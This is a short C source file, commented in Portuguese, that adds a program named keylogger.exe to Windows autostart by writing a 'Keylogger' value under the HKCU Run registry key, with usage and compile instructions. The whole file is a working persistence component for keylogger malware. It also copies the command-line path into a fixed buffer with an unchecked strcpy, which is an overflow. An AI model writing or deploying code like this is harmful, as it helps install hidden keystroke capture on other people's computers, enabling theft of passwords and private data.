/*
 * add_startup.c
 *
 * Programa para adicionar o keylogger.exe à inicialização automática do Windows
 * via Registro (HKCU\Software\Microsoft\Windows\CurrentVersion\Run).
 *
 * Uso: add_startup.exe "caminho\para\keylogger.exe"
 * Se nenhum argumento, assume "keylogger.exe" no diretório atual.
 *
 * Compilação: gcc add_startup.c -o add_startup.exe
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    HKEY hKey;
    const char *keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char *valueName = "Keylogger";
    char exePath[MAX_PATH];

    // Obter caminho do keylogger.exe
    if (argc > 1) {
        strcpy(exePath, argv[1]);
    } else {
        // Assume keylogger.exe no diretório atual
        strcpy(exePath, ".\\keylogger.exe");
    }

    // Abrir chave do registro
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Definir valor
        if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
            printf("Sucesso! Keylogger adicionado à inicialização: %s\n", exePath);
        } else {
            printf("Erro ao definir valor no registro.\n");
        }
        RegCloseKey(hKey);
    } else {
        printf("Erro ao abrir chave do registro. Execute como administrador.\n");
    }

    return 0;
}